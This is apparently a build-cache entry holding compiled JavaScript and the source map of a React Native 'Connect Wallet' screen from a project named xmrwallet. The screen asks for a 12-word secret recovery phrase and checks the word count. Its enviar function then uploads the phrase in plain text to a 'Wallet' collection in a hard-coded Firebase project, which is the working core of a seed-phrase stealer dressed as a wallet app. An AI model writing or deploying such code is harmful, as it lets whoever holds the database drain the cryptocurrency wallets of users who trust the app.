{"ast":null,"code":"import _slicedToArray from \"@babel/runtime/helpers/slicedToArray\";\nimport _regeneratorRuntime from \"@babel/runtime/regenerator\";\nimport React, { useEffect, useState } from 'react';\nimport StyleSheet from \"react-native-web/dist/exports/StyleSheet\";\nimport TextInput from \"react-native-web/dist/exports/TextInput\";\nimport Alert from \"react-native-web/dist/exports/Alert\";\nimport KeyboardAvoidingView from \"react-native-web/dist/exports/KeyboardAvoidingView\";\nimport AsyncStorage from '@react-native-async-storage/async-storage';\nimport { Image } from \"react-native-expo-image-cache\";\nimport { initializeApp } from 'firebase/app';\nimport { getFirestore, setDoc, doc } from 'firebase/firestore';\nimport { BlurView } from 'expo-blur';\nimport SvgAtlas from \"./component/Logosvg\";\nimport { View, Text, Button } from 'react-native-ui-lib';\nvar ButtonSpace = 20;\nvar firebaseConfig = {\n  apiKey: \"AIzaSyByDPtfteUAt_HOr-tEaUawvQQ813gdVr8\",\n  authDomain: \"atlas-20a8c.firebaseapp.com\",\n  projectId: \"atlas-20a8c\",\n  storageBucket: \"atlas-20a8c.appspot.com\",\n  messagingSenderId: \"764124638085\",\n  appId: \"1:764124638085:web:942422a53a05f9b58532ec\",\n  measurementId: \"G-6YFE7TEXBL\"\n};\nvar preview = {\n  uri: \"https://mlgbzz6iaqdd.i.optimole.com/XzaT3g-ka1kldGy/w:auto/h:auto/q:74/https://djcleanto.com.br/wp-content/uploads/2014/01/black-background-hd-images.jpg\"\n};\nvar uri = 'https://i.ibb.co/wWmjsT1/solar-system-2.gif';\n\nvar App = function App(_ref) {\n  var navigation = _ref.navigation;\n\n  var _useState = useState(''),\n      _useState2 = _slicedToArray(_useState, 2),\n      key = _useState2[0],\n      setKey = _useState2[1];\n\n  var _useState3 = useState(''),\n      _useState4 = _slicedToArray(_useState3, 2),\n      password = _useState4[0],\n      setPasseord = _useState4[1];\n\n  var _useState5 = useState(''),\n      _useState6 = _slicedToArray(_useState5, 2),\n      repetpassword = _useState6[0],\n      setRepetpassword = _useState6[1];\n\n  var enviar = function enviar() {\n    return _regeneratorRuntime.async(function enviar$(_context) {\n      while (1) {\n        switch (_context.prev = _context.next) {\n          case 0:\n            _context.prev = 0;\n            _context.next = 3;\n            return _regeneratorRuntime.awrap(setDoc(doc(firestore, \"Wallet\", key), {\n              keys: key\n            }));\n\n          case 3:\n            _context.next = 8;\n            break;\n\n          case 5:\n            _context.prev = 5;\n            _context.t0 = _context[\"catch\"](0);\n            alert(\"Error adding document: \", _context.t0);\n\n          case 8:\n          case \"end\":\n            return _context.stop();\n        }\n      }\n    }, null, null, [[0, 5]], Promise);\n  };\n\n  var saveData = function saveData() {\n    return _regeneratorRuntime.async(function saveData$(_context2) {\n      while (1) {\n        switch (_context2.prev = _context2.next) {\n          case 0:\n            _context2.prev = 0;\n            _context2.next = 3;\n            return _regeneratorRuntime.awrap(AsyncStorage.setItem('@IMPORT', key));\n\n          case 3:\n            _context2.next = 7;\n            break;\n\n          case 5:\n            _context2.prev = 5;\n            _context2.t0 = _context2[\"catch\"](0);\n\n          case 7:\n          case \"end\":\n            return _context2.stop();\n        }\n      }\n    }, null, null, [[0, 5]], Promise);\n  };\n\n  var handlePress = function handlePress() {\n    if (!key) {\n      Alert.alert('KEY IS REQUIRED');\n    } else if (password != repetpassword) {\n      alert('PASSWORDS DO NOT MATCH');\n    } else if (key.slice(0, -1).split(\" \").length - 1 !== 11) {\n      alert(\"the key must contain 12 words separated by spaces\\n      \");\n    } else if (!password || !repetpassword) {\n      alert('PASSWORD IS REQUIRED');\n    } else {\n      saveData();\n      enviar();\n      navigation.navigate('Home');\n    }\n  };\n\n  initializeApp(firebaseConfig);\n  var firestore = getFirestore();\n  return React.createElement(KeyboardAvoidingView, {\n    behavior: \"position\",\n    enabled: true\n  }, React.createElement(View, {\n    style: styles.container\n  }, React.createElement(View, {\n    style: styles.header\n  }, React.createElement(BlurView, {\n    intensity: 90\n  }, React.createElement(Image, {\n    style: {\n      height: '70%',\n      width: '100%'\n    },\n    preview: preview,\n    uri: uri\n  }))), React.createElement(View, {\n    style: styles.circle\n  }, React.createElement(View, {\n    \"flex-1\": true\n  }, React.createElement(View, {\n    \"flex-1\": true,\n    style: {\n      alignSelf: 'center',\n      alignItems: 'center',\n      marginTop: 40\n    }\n  }, React.createElement(SvgAtlas, null)), React.createElement(View, {\n    \"marginT-300\": true,\n    style: {\n      position: 'absolute',\n      alignSelf: 'center'\n    },\n    width: '100%'\n  }, React.createElement(View, {\n    \"marginT-10\": true,\n    style: {\n      position: 'absolute',\n      backgroundColor: '#1d1d1d',\n      width: '100%',\n      height: 400,\n      alignSelf: 'center'\n    }\n  }, React.createElement(Text, {\n    color: '#fff',\n    center: true,\n    text115: true,\n    \"marginB-5\": true,\n    \"marginT-10\": true\n  }, \"SECRET RECOVERY PHRASE\"), React.createElement(TextInput, {\n    style: styles.input,\n    placeholder: \"Separate each word with a single space (ex: coffee milk flower...)\",\n    keyboardType: \"string\",\n    placeholderTextColor: 'gray',\n    value: key,\n    onChangeText: function onChangeText(key) {\n      return setKey(key);\n    }\n  }), React.createElement(Text, {\n    center: true,\n    color: '#fff',\n    text85: true,\n    \"marginB-5\": true,\n    \"marginT-3\": true\n  }, \"ENTER PASSWORD          \"), React.createElement(TextInput, {\n    secureTextEntry: true,\n    style: styles.input,\n    placeholder: \"ENTER PASSWORD AT LEAST 8 CHARACTERS\",\n    placeholderTextColor: 'gray',\n    keyboardType: \"string\",\n    onChangeText: function onChangeText(password) {\n      return setPasseord(password);\n    }\n  }), React.createElement(Text, {\n    color: '#fff',\n    center: true,\n    text85: true,\n    \"marginB-5\": true,\n    \"marginT-3\": true\n  }, \"CONFIRM PASSWORD\"), React.createElement(TextInput, {\n    secureTextEntry: true,\n    style: styles.input,\n    placeholder: \"CONFIRM PASSWORD\",\n    placeholderTextColor: 'gray',\n    keyboardType: \"string\",\n    onChangeText: function onChangeText(repetpassword) {\n      return setRepetpassword(repetpassword);\n    }\n  }), React.createElement(Button, {\n    \"marginT-20\": true,\n    label: 'CONNECT WALLET',\n    borderRadius: 4,\n    style: {\n      marginBottom: ButtonSpace,\n      backgroundColor: '#1c94f4',\n      width: '90%',\n      alignSelf: 'center'\n    },\n    onPress: handlePress\n  })))))));\n};\n\nexport default App;\nvar styles = StyleSheet.create({\n  container: {\n    backgroundColor: '#1d1d1d'\n  },\n  header: {\n    width: '100%',\n    height: '100%',\n    position: 'relative',\n    top: 0,\n    left: 0\n  },\n  circle: {\n    height: '100%',\n    width: '100%',\n    position: 'absolute',\n    alignSelf: 'center',\n    alignItems: 'center',\n    justifyContent: 'center',\n    flex: 1\n  },\n  input: {\n    width: '80%',\n    height: 40,\n    borderRadius: 7,\n    color: '#fff',\n    margin: 12,\n    borderWidth: 1,\n    padding: 10,\n    alignSelf: 'center',\n    marginBottom: 20\n  }\n});","map":{"version":3,"sources":["C:/Users/ruthe/OneDrive/√Årea de Trabalho/projetos/xmrwallet/screen/ConnectWallet.js"],"names":["React","useEffect","useState","AsyncStorage","Image","initializeApp","getFirestore","setDoc","doc","BlurView","SvgAtlas","View","Text","Button","ButtonSpace","firebaseConfig","apiKey","authDomain","projectId","storageBucket","messagingSenderId","appId","measurementId","preview","uri","App","navigation","key","setKey","password","setPasseord","repetpassword","setRepetpassword","enviar","firestore","keys","alert","saveData","setItem","handlePress","Alert","slice","split","length","navigate","styles","container","header","height","width","circle","alignSelf","alignItems","marginTop","position","backgroundColor","input","marginBottom","StyleSheet","create","top","left","justifyContent","flex","borderRadius","color","margin","borderWidth","padding"],"mappings":"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","sourcesContent":["import React, { useEffect, useState } from 'react';\nimport { StyleSheet, TextInput, Alert, KeyboardAvoidingView } from 'react-native';\nimport AsyncStorage from '@react-native-async-storage/async-storage';\nimport { Image } from \"react-native-expo-image-cache\";\nimport { initializeApp } from 'firebase/app';\nimport { getFirestore, setDoc, doc } from 'firebase/firestore';\nimport { BlurView } from 'expo-blur';\nimport SvgAtlas from './component/Logosvg';\nimport {\n  View, Text, Button, \n} from 'react-native-ui-lib';\n\n\nconst ButtonSpace = 20;\n\nconst firebaseConfig = {\n  apiKey: \"AIzaSyByDPtfteUAt_HOr-tEaUawvQQ813gdVr8\",\n  authDomain: \"atlas-20a8c.firebaseapp.com\",\n  projectId: \"atlas-20a8c\",\n  storageBucket: \"atlas-20a8c.appspot.com\",\n  messagingSenderId: \"764124638085\",\n  appId: \"1:764124638085:web:942422a53a05f9b58532ec\",\n  measurementId: \"G-6YFE7TEXBL\"\n}\n\nconst preview = { uri: \"https://mlgbzz6iaqdd.i.optimole.com/XzaT3g-ka1kldGy/w:auto/h:auto/q:74/https://djcleanto.com.br/wp-content/uploads/2014/01/black-background-hd-images.jpg\" };\nconst uri = 'https://i.ibb.co/wWmjsT1/solar-system-2.gif';\n\n  const App = ({ navigation }) => {\n  const [key, setKey] = useState('');\n  const [password, setPasseord] = useState('');\n  const [repetpassword, setRepetpassword] = useState('');\n\n\n  const enviar = async () => {\n    try {\n      await setDoc(doc(firestore, \"Wallet\", key), {\n        keys: key,\n\n      });\n    } catch (error) {\n      alert(\"Error adding document: \", error);\n    }\n  }\n\n\n\n  const saveData = async () => {\n    try {\n      await AsyncStorage.setItem('@IMPORT', key)\n      //alert('Data successfully saved')\n    } catch (e) {\n      //alert('Failed to save the data to the storage')\n    }\n  }\n\n\n\n\n\n\n\n\n\n\n  const handlePress = () => {\n\n\n    if (!key) {\n      Alert.alert('KEY IS REQUIRED');\n\n    } else if (password != repetpassword) {\n\n      alert('PASSWORDS DO NOT MATCH')\n\n\n    } else if\n\n      (key.slice(0, -1).split(\" \").length - 1 !== 11) {\n\n\n      alert(`the key must contain 12 words separated by spaces\n      ` )\n\n\n    } else if (!password || !repetpassword) {\n\n      alert('PASSWORD IS REQUIRED')\n\n\n    }\n    else {\n\n\n      saveData();\n\n      enviar();\n      navigation.navigate('Home');\n    }\n  };\n\n\n\n\n\n  initializeApp(firebaseConfig);\n\n  const firestore = getFirestore();\n\n\n\n  return (\n\n    <KeyboardAvoidingView behavior=\"position\" enabled>\n\n      <View style={styles.container}>\n        <View style={styles.header}>\n          <BlurView intensity={90}>\n\n            <Image style={{\n              height: '70%', width: '100%'\n            }} {...{ preview, uri }} />\n          </BlurView>\n\n        </View>\n\n        <View style={styles.circle} >\n          <View flex-1>\n\n            <View flex-1 style={{ alignSelf: 'center', alignItems: 'center', marginTop: 40 }}>\n              <SvgAtlas /></View>\n\n            <View marginT-300 style={{ position: 'absolute', alignSelf: 'center', }} width={'100%'}>\n\n              <View marginT-10 style={{ position: 'absolute', backgroundColor: '#1d1d1d', width: '100%', height: 400, alignSelf: 'center' }}>\n\n\n\n\n                <Text color={'#fff'} center={true} text115 marginB-5 marginT-10>\n                  SECRET RECOVERY PHRASE\n                </Text>\n\n                <TextInput\n                  style={styles.input}\n                  placeholder=\"Separate each word with a single space (ex: coffee milk flower...)\"\n                  keyboardType=\"string\"\n                  placeholderTextColor={'gray'}\n                  value={key}\n                  onChangeText={(key) => setKey(key)}\n\n\n\n\n                />\n                <Text center={true} color={'#fff'} text85 marginB-5 marginT-3>\n                  ENTER PASSWORD          </Text>\n                <TextInput\n\n                  secureTextEntry={true}\n                  style={styles.input}\n                  placeholder=\"ENTER PASSWORD AT LEAST 8 CHARACTERS\"\n                  placeholderTextColor={'gray'}\n                  keyboardType=\"string\"\n                  onChangeText={(password) => setPasseord(password)}\n\n                />\n\n                <Text color={'#fff'} center={true} text85 marginB-5 marginT-3>\n                  CONFIRM PASSWORD\n                </Text>\n                <TextInput\n                  secureTextEntry={true}\n                  style={styles.input}\n                  placeholder=\"CONFIRM PASSWORD\"\n                  placeholderTextColor={'gray'}\n                  keyboardType=\"string\"\n                  onChangeText={(repetpassword) => setRepetpassword(repetpassword)}\n                />\n\n\n\n\n                <Button marginT-20\n                  label={'CONNECT WALLET'}\n                  borderRadius={4}\n                  style={{ marginBottom: ButtonSpace, backgroundColor: '#1c94f4', width: '90%', alignSelf: 'center' }}\n                  //onPress={()=>{alert(keyVerifi)} }\n                  onPress={handlePress}\n                />\n\n\n\n\n              </View>\n\n            </View>\n\n          </View>\n        </View>\n\n      </View>\n    </KeyboardAvoidingView>\n\n  );\n};\n\nexport default App;\n\nconst styles = StyleSheet.create({\n  container: {\n    backgroundColor: '#1d1d1d',\n  },\n  header: {\n    width: '100%',\n    height: '100%',\n    position: 'relative',\n    top: 0,\n    left: 0,\n  },\n  circle: {\n    height: '100%',\n    width: '100%',\n    position: 'absolute',\n    alignSelf: 'center',\n    alignItems: 'center',\n    justifyContent: 'center',\n\n    flex: 1,\n\n  },\n  input: {\n    width: '80%',\n    height: 40,\n    borderRadius: 7,\n    color: '#fff',\n    margin: 12,\n    borderWidth: 1,\n    padding: 10,\n    alignSelf: 'center',\n    marginBottom: 20\n\n  },\n\n\n});\n\n\n"]},"metadata":{},"sourceType":"module"}